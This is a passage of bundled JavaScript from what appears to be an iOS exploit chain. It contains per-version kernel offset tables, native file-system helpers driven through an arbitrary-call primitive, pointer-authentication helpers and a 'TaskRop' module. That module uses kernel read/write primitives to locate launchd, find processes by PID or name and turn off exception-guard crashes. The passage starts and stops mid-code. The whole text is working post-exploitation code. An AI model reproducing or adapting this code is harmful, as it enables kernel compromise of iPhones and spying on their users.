0x40cn,\n\t\t\t\t\tmutexData: 0x418n,\n\t\t\t\t\tctid: 0x4a8n,\n\t\t\t\t\tmigLock: 0x408acd0n,\n\t\t\t\t\tmigSbxMsg: 0x408acf0n,\n\t\t\t\t\tmigKernelStackLR: 0x396e4a0n\n\t\t\t\t},\n\t\t\t\t5: {\n\t\t\t\t\tkernelTask: 0xc17e68n,\n\t\t\t\t\tmigLock: 0x40a6f08n,\n\t\t\t\t\tmigSbxMsg: 0x40a6f28n,\n\t\t\t\t\tmigKernelStackLR: 0x3987924n\n\t\t\t\t},\n\t\t\t\t6: {\n\t\t\t\t\tkernelTask: 0xc1ff78n,\n\t\t\t\t\tguardExcCode: 0x398n,\n\t\t\t\t\ttaskThreads: 0x3e8n,\n\t\t\t\t\ttro: 0x3f0n,\n\t\t\t\t\tast: 0x414n,\n\t\t\t\t\tmutexData: 0x420n,\n\t\t\t\t\tctid: 0x4b0n,\n\t\t\t\t\tmigLock: 0x40b6e98n,\n\t\t\t\t\tmigSbxMsg: 0x40b6eb8n,\n\t\t\t\t\tmigKernelStackLR: 0x3998de0n,\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/JSUtils/FileUtils.js\":\n/*!***************************************!*\\\n  !*** ./src/libs/JSUtils/FileUtils.js ***!\n  \\***************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ FileUtils)\n/* harmony export */ });\n\n\nconst TAG = \"FILE-UTILS\";\n\nconst O_RDONLY\t= 0x0000;\nconst O_WRONLY\t= 0x0001;\nconst O_RDWR\t= 0x0002;\nconst O_APPEND  = 0x0008;\nconst O_CREAT\t= 0x0200;\nconst O_TRUNC\t= 0x0400;\nconst O_EVTONLY\t= 0x8000;\n\nconst ERROR\t\t= -1;\n\nconst DT = {\n\tDT_UNKNOWN: 0,\n\tDT_FIFO: 1,\n\tDT_CHR: 2,\n\tDT_DIR: 4,\n\tDT_BLK: 6,\n\tDT_REG: 8,\n\tDT_LNK: 10,\n\tDT_SOCK: 12,\n\tDT_WHT: 14\n};\n\nconst SEEK_SET = 0;\n\nclass FileUtils {\n\n\n\tstatic open(path) {\n\t\tconst fd = Native.callSymbol(\"open\", path, O_RDONLY);\n\t\tif (fd == ERROR) {\n\t\t\tconsole.log(TAG, \"Unable to open: \" + path);\n\t\t\treturn false;\n\t\t}\n\t\treturn fd;\n\t}\n\n\tstatic close(fd) {\n\t\tNative.callSymbol(\"close\", fd);\n\t}\n\n\tstatic read(fd, size=0) {\n\t\tif (!size || size > Native.memSize)\n\t\t\tsize = Native.memSize;\n\t\tconst len = Native.callSymbol(\"read\", fd, Native.mem, size);\n\t\tif (!len || len == ERROR)\n\t\t\treturn false;\n\t\tconst buff = Native.read(Native.mem, len);\n\t\treturn buff;\n\t}\n\n\tstatic readFile(path, seek=0, length=0) {\n\t\tconst fd = this.open(path);\n\t\tif (fd === false)\n\t\t\treturn null;\n\n\t\tlet data = new Uint8Array();\n\n\t\tif (seek)\n\t\t\tNative.callSymbol(\"lseek\", fd, seek, SEEK_SET);\n\n\t\tlet remaining = length;\n\n\t\twhile (true) {\n\t\t\tlet size = remaining ? remaining : Native.memSize;\n\t\t\tif (size > Native.memSize)\n\t\t\t\tsize = Native.memSize;\n\t\t\tconst buff = this.read(fd, size);\n\t\t\tif (buff === false)\n\t\t\t\tbreak;\n\t\t\tconst buff8 = new Uint8Array(buff);\n\t\t\tlet newData = new Uint8Array(data.length + buff8.length);\n\t\t\tnewData.set(data, 0);\n\t\t\tnewData.set(buff8, data.length);\n\t\t\tdata = newData;\n\n\t\t\tif (remaining) {\n\t\t\t\tremaining -= buff.byteLength;\n\t\t\t\tif (!remaining)\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tthis.close(fd);\n\n\t\treturn data.buffer;\n\t}\n\n\tstatic writeFile(path, data) {\n\t\treturn this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_TRUNC);\n\t}\n\n\tstatic appendFile(path, data) {\n\t\treturn this.#commonWriteFile(path, data, O_WRONLY | O_CREAT | O_APPEND);\n\t}\n\n\tstatic deleteFile(path) {\n\t\tNative.callSymbol(\"unlink\", path);\n\t}\n\tstatic foreachDir(path, func) {\n\t\tlet dir = Native.callSymbol(\"opendir\", path);\n\t\tif (!dir) {\n\t\t\tconsole.log(TAG, \"Unable to open dir: \" + path);\n\t\t\treturn;\n\t\t}\n\n\t\twhile (true) {\n\t\t\tlet item = this.#readdir(dir);\n\t\t\tif (!item)\n\t\t\t\tbreak;\n\n\t\t\tswitch (item.d_type) {\n\t\t\t\tcase DT.DT_DIR:\n\t\t\t\t\tif (item.d_name.startsWith(\".\"))\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tfunc(item.d_name);\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tNative.callSymbol(\"closedir\", dir);\n\t}\n\n\tstatic foreachFile(path, func) {\n\t\tlet dir = Native.callSymbol(\"opendir\", path);\n\t\tif (!dir) {\n\t\t\tconsole.log(TAG, \"Unable to open dir: \" + path);\n\t\t\treturn false;\n\t\t}\n\n\t\twhile (true) {\n\t\t\tlet item = this.#readdir(dir);\n\t\t\tif (!item)\n\t\t\t\tbreak;\n\n\t\t\tswitch (item.d_type) {\n\t\t\t\tcase DT.DT_REG:\n\t\t\t\t\tfunc(item.d_name);\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\tNative.callSymbol(\"closedir\", dir);\n\t\treturn true;\n\t}\n\n\tstatic createDir(path, permission=0o755) {\n\t\treturn !Native.callSymbol(\"mkdir\", path, permission);\n\t}\n\n\tstatic deleteDir(path, recursive=false) {\n\t\tif (recursive) {\n\t\t\tconst dir = Native.callSymbol(\"opendir\", path);\n\t\t\tif (!dir) {\n\t\t\t\tconsole.log(TAG, \"deleteDir: Unable to open dir: \" + path);\n\t\t\t\treturn false;\n\t\t\t}\n\n\t\t\twhile (true) {\n\t\t\t\tconst item = this.#readdir(dir);\n\t\t\t\tif (!item)\n\t\t\t\t\tbreak;\n\n\t\t\t\tconst newPath = path + '/' + item.d_name;\n\n\t\t\t\tswitch (item.d_type) {\n\t\t\t\t\tcase DT.DT_DIR:\n\t\t\t\t\t\tif (item.d_name.startsWith(\".\"))\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\tthis.deleteDir(newPath, true);\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tcase DT.DT_REG:\n\t\t\t\t\t\tconsole.log(TAG, `deleting: ${newPath}`);\n\t\t\t\t\t\tthis.deleteFile(newPath);\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tNative.callSymbol(\"closedir\", dir);\n\t\t}\n\n\t\treturn !Native.callSymbol(\"rmdir\", path);\n\t}\n\n\tstatic exists(path, permission=0/*F_OK*/) {\n\t\treturn !Native.callSymbol(\"access\", path, permission);\n\t}\n\n\tstatic stat(path) {\n\t\tconst ret = Native.callSymbol(\"stat\", path, Native.mem);\n\t\tif (ret == ERROR)\n\t\t\treturn null;\n\t\tconst buff = Native.read(Native.mem, 144);\n\t\tconst view = new DataView(buff);\n\n\t\tconst dev = view.getInt32(0, true);\n\t\tconst mode = view.getUint16(0x4, true);\n\t\tconst nlink = view.getUint16(0x6, true);\n\t\tconst ino = view.getBigUint64(0x8, true);\n\t\tconst uid = view.getUint32(0x10, true);\n\t\tconst gid = view.getUint32(0x14, true);\n\t\tconst atime_tv_sec = view.getBigInt64(0x20, true);\n\t\tconst mtime_tv_sec = view.getBigInt64(0x30, true);\n\t\tconst ctime_tv_sec = view.getBigInt64(0x40, true);\n\t\tconst size = view.getBigInt64(0x60, true);\n\n\t\treturn {\n\t\t\tmode: Number(mode),\n\t\t\tino: Number(ino),\n\t\t\tdev: Number(dev),\n\t\t\tnlink: Number(nlink),\n\t\t\tuid: Number(uid),\n\t\t\tgid: Number(gid),\n\t\t\tsize: Number(size),\n\t\t\tatime: Number(atime_tv_sec),\n\t\t\tmtime: Number(mtime_tv_sec),\n\t\t\tctime: Number(ctime_tv_sec)\n\t\t};\n\t}\n\n\tstatic #readdir(dir) {\n\t\tconst itemPtr = Native.callSymbol(\"readdir\", dir);\n\t\tif (!itemPtr)\n\t\t\treturn null;\n\n\t\tconst item = Native.read(itemPtr, 24);\n\t\tconst view = new DataView(item);\n\n\t\tconst d_ino = view.getBigUint64(0, true);\n\t\tconst d_namlen = view.getUint16(18, true);\n\t\tconst d_type = view.getUint8(20);\n\t\tconst d_name = Native.readString(itemPtr + 21n, d_namlen + 1);\n\n\t\treturn {\n\t\t\td_ino: d_ino,\n\t\t\td_type: d_type,\n\t\t\td_name: d_name\n\t\t};\n\t}\n\n\tstatic #commonWriteFile(path, data, flags) {\n\t\tconst fd = Native.callSymbol(\"open\", path, flags, 0o644);\n\t\tif (fd == ERROR) {\n\t\t\tconsole.log(TAG, \"Unable to open: \" + path);\n\t\t\treturn false;\n\t\t}\n\n\t\t// For some reason file mode is not applied on open()\n\t\tNative.callSymbol(\"fchmod\", fd, 0o644);\n\n\t\tlet offs = 0;\n\t\tlet left = data.byteLength;\n\n\t\tconst buffSize = 0x4000;\n\t\tconst buffPtr = Native.callSymbol(\"malloc\", buffSize);\n\n\t\twhile (true) {\n\t\t\tconst size = left > buffSize ? buffSize : left;\n\t\t\tconst src8 = new Uint8Array(data, offs, size);\n\t\t\tconst dst8 = new Uint8Array(src8);\n\t\t\tNative.write(buffPtr, dst8.buffer);\n\t\t\tconst len = Native.callSymbol(\"write\", fd, buffPtr, size);\n\t\t\tif (!len || len == ERROR)\n\t\t\t\tbreak;\n\t\t\toffs += len;\n\t\t\tleft -= len;\n\t\t\tif (!left)\n\t\t\t\tbreak;\n\t\t}\n\n\t\tNative.callSymbol(\"free\", buffPtr);\n\t\tNative.callSymbol(\"close\", fd);\n\n\t\treturn true;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/JSUtils/Logger.js\":\n/*!************************************!*\\\n  !*** ./src/libs/JSUtils/Logger.js ***!\n  \\************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Logger)\n/* harmony export */ });\n/* harmony import */ var _FileUtils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./FileUtils */ \"./src/libs/JSUtils/FileUtils.js\");\n/* harmony import */ var _Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ../Chain/Native */ \"./src/libs/Chain/Native.js\");\n\n\n\nclass Logger {\n\n\tstatic #logging = false;\n\tstatic #logfile = \"/private/var/mobile/Media/PostLogs.txt\";\n\n\tstatic {\n\t\t//LOG(\"Log file: \" + Logger.#logfile);\n\t}\n\n\tstatic log(TAG, msg) {\n\t\t// Avoid recursive logging\n\t\tif (Logger.#logging)\n\t\t\treturn;\n\t\tLogger.#logging = true;\n\t\tconst logMsg = `[${TAG}] ${msg}`;\n\n\t\tLOG(logMsg);\n\n\t\tif (false) // removed by dead control flow\n{}\n\t\tLogger.#logging = false;\n\t}\n\n\tstatic clearPreviousLogs(){\n\t\t_Chain_Native__WEBPACK_IMPORTED_MODULE_1__[\"default\"].callSymbol(\"unlink\", Logger.#logfile);\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/JSUtils/Utils.js\":\n/*!***********************************!*\\\n  !*** ./src/libs/JSUtils/Utils.js ***!\n  \\***********************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Utils)\n/* harmony export */ });\n\n\nconst TAG = \"UTILS\";\n\nconst DT = {\n\tDT_UNKNOWN: 0,\n\tDT_FIFO: 1,\n\tDT_CHR: 2,\n\tDT_DIR: 4,\n\tDT_BLK: 6,\n\tDT_REG: 8,\n\tDT_LNK: 10,\n\tDT_SOCK: 12,\n\tDT_WHT: 14\n};\n\nclass Utils {\n\n\tstatic UINT64_SIZE = 8;\n\tstatic UINT32_SIZE = 4;\n\tstatic UINT16_SIZE = 2;\n\tstatic ARM_THREAD_STATE64 = 6;\n\tstatic ARM_THREAD_STATE64_SIZE = 0x110;\n\tstatic ARM_THREAD_STATE64_COUNT = (this.ARM_THREAD_STATE64_SIZE / this.UINT32_SIZE);\n\tstatic ptrauth_key_asia = 0;\n\tstatic EXC_BAD_ACCESS = 1n;\n\tstatic EXC_GUARD = 12n;\n\tstatic EXC_MASK_GUARD = (1n << this.EXC_GUARD);\n\tstatic EXC_MASK_BAD_ACCESS = (1n << this.EXC_BAD_ACCESS);\n\tstatic EXCEPTION_STATE = 2n;\n\tstatic MACH_EXCEPTION_CODES = 0x80000000n;\n\tstatic PAGE_SIZE = 0x4000n;\n\tstatic PAGE_MASK = (this.PAGE_SIZE - 1n);\n\n\tstatic hex(val) {\n\t\treturn val.toString(16);\n\t}\n\n\tstatic memmem(haystack, needle) {\n\t\tconst hLen = haystack.byteLength;\n\t\tconst nLen = needle.byteLength;\n\n\t\tif (nLen === 0 || hLen < nLen) {\n\t\t  return 0;\n\t\t}\n\n\t\tconst haystackView = new Uint8Array(haystack);\n\t\tconst needleView = new Uint8Array(needle);\n\n\t\tfor (let i = 0; i <= hLen - nLen; i++) {\n\t\t  let found = true;\n\t\t  for (let j = 0; j < nLen; j++) {\n\t\t\tif (haystackView[i + j] !== needleView[j]) {\n\t\t\t  found = false;\n\t\t\t  break;\n\t\t\t}\n\t\t  }\n\t\t  if (found) {\n\t\t\treturn i;\n\t\t  }\n\t\t}\n\n\t\treturn 0;\n\t}\n\n\tstatic ptrauth_string_discriminator(discriminator)\n\t{\n\t\tswitch (discriminator) {\n\t\t\tcase \"pc\":\n\t\t\t\treturn 0x7481n;\n\t\t\tcase \"lr\":\n\t\t\t\treturn 0x77d3n;\n\t\t\tcase \"sp\":\n\t\t\t\treturn 0xcbedn;\n\t\t\tcase \"fp\":\n\t\t\t\treturn 0x4517n;\n\t\t\tdefault:\n\t\t\t\tconsole.log(TAG,`Cannot find discriminator for value:${discriminator}`);\n\t\t\t\treturn 0n;\n\t\t}\n\t}\n\n\tstatic ptrauth_string_discriminator_special(discriminator)\n\t{\n\t\tswitch (discriminator) {\n\t\t\tcase \"pc\":\n\t\t\t\treturn 0x7481000000000000n;\n\t\t\tcase \"lr\":\n\t\t\t\treturn 0x77d3000000000000n;\n\t\t\tcase \"sp\":\n\t\t\t\treturn 0xcbed000000000000n;\n\t\t\tcase \"fp\":\n\t\t\t\treturn 0x4517000000000000n;\n\t\t\tdefault:\n\t\t\t\tconsole.log(TAG,`Cannot find discriminator for value:${discriminator}`);\n\t\t\t\treturn 0n;\n\t\t}\n\t}\n\n\tstatic ptrauth_blend_discriminator(diver,discriminator)\n\t{\n\t\treturn diver & 0xFFFFFFFFFFFFn | discriminator;\n\t}\n\n    static printArrayBufferInChunks(buffer) {\n        const view = new DataView(buffer);\n        const chunkSize = 8;\n\n        for (let i = 0; i < buffer.byteLength; i += chunkSize) {\n\t\t\t// Read the chunk as a BigInt\n\t\t\tconst chunk = view.getBigUint64(i, true); // Little-endian\n\n            console.log(TAG, `0x${Utils.hex(i)}: ${Utils.hex(chunk)}`);\n        }\n    }\n\n\tstatic MIN(a, b)\n\t{\n\t\tif(a < b)\n\t\t\treturn a;\n\t\treturn b;\n\t}\n\n\tstatic MAX(a, b)\n\t{\n\t\tif(a > b)\n\t\t\treturn a;\n\t\treturn b;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/RegistersStruct.js\":\n/*!*********************************************!*\\\n  !*** ./src/libs/TaskRop/RegistersStruct.js ***!\n  \\*********************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ RegistersStruct)\n/* harmony export */ });\nconst TAG = \"REGISTERSSTRUCT\"\n\nclass RegistersStruct\n{\n\t#dataView;\n\n\tconstructor(buffer, offset = 0, length = 29) {\n\t\tthis.#dataView = new DataView(buffer,offset, length * 8);\n\t\tthis.length = length;\n\t}\n    \n\tget(index) {\n        if (index >= this.length || index < 0) {\n            console.log(TAG,`Got wrong index in get:${index}`);\n\t\t\treturn;\n        }\n        return this.#dataView.getBigUint64(index * 8, true); // true for little-endian\n    }\n\n    set(index, value) {\n        if (index >= this.length || index < 0) {\n            console.log(TAG,`Got wrong index in set`);\n\t\t\treturn;\n        }\n        this.#dataView.setBigUint64(index * 8, BigInt(value), true); // true for little-endian\n    }\n}\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/SelfTaskStruct.js\":\n/*!********************************************!*\\\n  !*** ./src/libs/TaskRop/SelfTaskStruct.js ***!\n  \\********************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ SelfTaskStruct)\n/* harmony export */ });\nclass SelfTaskStruct \n{\n\t#buffer;\n\t#dataView;\n\tconstructor()\n\t{\n\t\tthis.#buffer = new ArrayBuffer(32);\n\t\tthis.#dataView = new DataView(this.#buffer);\n\t\tthis.addr = 0x0n;\n\t\tthis.spaceTable = 0x0n;\n\t\tthis.portObject = 0x0n;\n\t\tthis.launchdTask = 0x0n;\n\t}\n\tget addr()\n\t{\n\t\treturn this.#dataView.getBigUint64(0,true);\n\t}\n\tset addr(value)\n\t{\n\t\tthis.#dataView.setBigUint64(0,value,true);\n\t}\n\tget spaceTable()\n\t{\n\t\treturn this.#dataView.getBigUint64(8,true);\n\t}\n\tset spaceTable(value)\n\t{\n\t\tthis.#dataView.setBigUint64(8,value,true);\n\t}\n\tget portObject()\n\t{\n\t\treturn this.#dataView.getBigUint64(16,true);\n\t}\n\tset portObject(value)\n\t{\n\t\tthis.#dataView.setBigUint64(16,value,true);\n\t}\n\tget launchdTask()\n\t{\n\t\treturn this.#dataView.getBigUint64(24,true);\n\t}\n\tset launchdTask(value)\n\t{\n\t\tthis.#dataView.setBigUint64(24,value,true);\n\t}\n}\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/Task.js\":\n/*!**********************************!*\\\n  !*** ./src/libs/TaskRop/Task.js ***!\n  \\**********************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Task)\n/* harmony export */ });\n/* harmony import */ var _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./SelfTaskStruct */ \"./src/libs/TaskRop/SelfTaskStruct.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ \"./src/libs/Chain/Native.js\");\n\n\n\n\n\nconst TAG = \"TASK\"\nconst TASK_EXC_GUARD_MP_CORPSE = 0x40;\nconst TASK_EXC_GUARD_MP_FATAL = 0x80;\nconst TASK_EXC_GUARD_MP_DELIVER = 0x10;\n\nclass Task\n{\n\tstatic gSelfTask;\n\tstatic KALLOC_ARRAY_TYPE_SHIFT;\n\n\tstatic {\n\t\tthis.gSelfTask = new _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__[\"default\"]();\n\t}\n\n\tstatic init(selfTaskAddr)\n\t{\n\t\t// Update KALLOC_ARRAY_TYPE_SHIFT\n\t\tthis.KALLOC_ARRAY_TYPE_SHIFT = BigInt((64n - libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().T1SZ_BOOT - 1n));\n\n\t\t/*\n\t\t * This function should be invoked as the initializer of the this Task utility.\n\t\t * It setups the global var \"gSelfTask\" containing values used all across the task functions to lookup ports.\n\t\t * It also retrieves the \"launchd\" task address.\n\t\t */\n\t\tthis.gSelfTask.addr = selfTaskAddr;\n\t\tlet spaceTable = this.#getSpaceTable(this.gSelfTask.addr);\n\t\tthis.gSelfTask.portObject = this.#getPortObject(spaceTable, 0x203n);\n\t\tthis.gSelfTask.launchdTask = this.#searchForLaunchdTask();\n\n\t\tconsole.log(TAG,`Self task address: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.gSelfTask.addr)}`);\n\t\tconsole.log(TAG,`Self task space table: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(spaceTable)}`);\n\t\tconsole.log(TAG,`Self task port object: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.gSelfTask.portObject)}`);\n\t\tconsole.log(TAG,`launchd task: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(this.gSelfTask.launchdTask)}`);\n\t}\n\n\tstatic trunc_page(addr)\n\t{\n\t\treturn addr & (~(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].PAGE_SIZE - 1n));\n\t}\n\n\tstatic round_page(addr)\n\t{\n\t\treturn this.trunc_page((addr) + (libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].PAGE_SIZE - 1n));\n\t}\n\n\tstatic pidof(name)\n\t{\n\t\tlet currTask = this.gSelfTask.launchdTask;\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pComm, command, 18);\n\t\t\tlet resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].readString(command,18);\n\t\t\tif(name === resultName)\n\t\t\t{\n\t\t\t\tlet pid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pid);\n\t\t\t\treturn pid;\n\t\t\t}\n\t\t\tlet nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().nextTask);\n\t\t\tif (!nextTask || nextTask == currTask)\n\t\t\t\tbreak;\n\t\t\tcurrTask = nextTask;\n\t\t}\n\t\treturn 0;\n\t}\n\n\tstatic getTaskAddrByPID(pid)\n\t{\n\t\tlet currTask = this.gSelfTask.launchdTask;\n\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pid);\n\t\t\tif (currPid == pid)\n\t\t\t\treturn currTask;\n\t\t\tlet nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().nextTask);\n\t\t\tif (!nextTask || (nextTask == currTask))\n\t\t\t\tbreak;\n\t\t\tcurrTask = nextTask;\n\t\t}\n\t\treturn 0;\n\t}\n\n\tstatic disableExcGuardKill(taskAddr)\n\t{\n\t\t// in mach_port_guard_ast, the victim would crash if these are on.\n\t\tlet excGuard = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().excGuard);\n\t\t//console.log(TAG,`Current excGuard:0x${Utils.hex(excGuard)}`);\n\t\texcGuard &= ~(TASK_EXC_GUARD_MP_CORPSE | TASK_EXC_GUARD_MP_FATAL);\n\t\texcGuard |= TASK_EXC_GUARD_MP_DELIVER;\n\t\t//console.log(TAG,`ExcGuard result:0x${Utils.hex(excGuard)}`);\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].write32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().excGuard, excGuard);\n\t}\n\n\tstatic getTaskAddrByName(name)\n\t{\n\t\tlet currTask = this.gSelfTask.launchdTask;\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pComm, command, 18);\n\t\t\tlet resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].readString(command,18);\n\t\t\t//console.log(TAG, `${Utils.hex(procAddr)}: ${resultName}`);\n\t\t\tif(name === resultName)\n\t\t\t{\n\t\t\t\t//console.log(TAG, `Found target process: ${name}`);\n\t\t\t\treturn currTask;\n\t\t\t}\n\t\t\tlet nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().nextTask);\n\t\t\tif (!nextTask || nextTask == currTask)\n\t\t\t\tbreak;\n\t\t\tcurrTask = nextTask;\n\t\t}\n\t\treturn false;\n\t}\n\n\tstatic getRightAddr(port)\n\t{\n\t\tlet spaceTable = this.#getSpaceTable(this.gSelfTask.addr);\n\t\treturn this.#getPortEntry(spaceTable, port);\n\t}\n\n\tstatic #getSpaceTable(taskAddr)\n\t{\n\t\tlet space = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().ipcSpace);\n\t\tlet spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(space + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().spaceTable);\n\t\t//console.log(TAG,`space: ${Utils.hex(space)}`);\n\t\t//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);\n\t\tspaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].strip(spaceTable);\n\t\t//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);\n\t\treturn this.#kallocArrayDecodeAddr(BigInt(spaceTable));\n\t}\n\n\tstatic #mach_port_index(port)\n\t{\n\t\treturn ((port) >> 8n);\n\t}\n\n\tstatic #getPortEntry(spaceTable, port)\n\t{\n\t\tlet portIndex = this.#mach_port_index(port);\n\t\treturn spaceTable + (portIndex * 0x18n);\n\t}\n\n\tstatic #getPortObject(spaceTable, port)\n\t{\n\t\t//console.log(TAG, `getPortObject(): space=${Utils.hex(spaceTable)}, port=${Utils.hex(port)}`);\n\t\tlet portEntry = this.#getPortEntry(spaceTable, port);\n\t\t//console.log(TAG,`portEntry: ${Utils.hex(portEntry)}`);\n\t\tlet portObject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(portEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().entryObject);\n\t\t//console.log(TAG,`portObject:${Utils.hex(portObject)}`);\n\t\treturn libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].strip(portObject);\n\t}\n\n\tstatic getTaskProc(taskAddr)\n\t{\n\t\tlet procROAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().procRO);\n\t\tlet procAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(procROAddr);\n\t\treturn procAddr;\n\t}\n\n\tstatic #searchForLaunchdTask()\n\t{\n\t\t/*\n\t\t * Traverse the tasks list backwards starting from the self task until we find the proc with PID 1.\n\t\t */\n\n\t\tlet currTask = this.gSelfTask.addr;\n\t\twhile (true)\n\t\t{\n\t\t\tlet procAddr = this.getTaskProc(currTask);\n\t\t\tlet currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().pid);\n\t\t\tif (currPid == 1)\n\t\t\t\treturn currTask;\n\t\t\tlet prevTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().prevTask);\n\t\t\tif 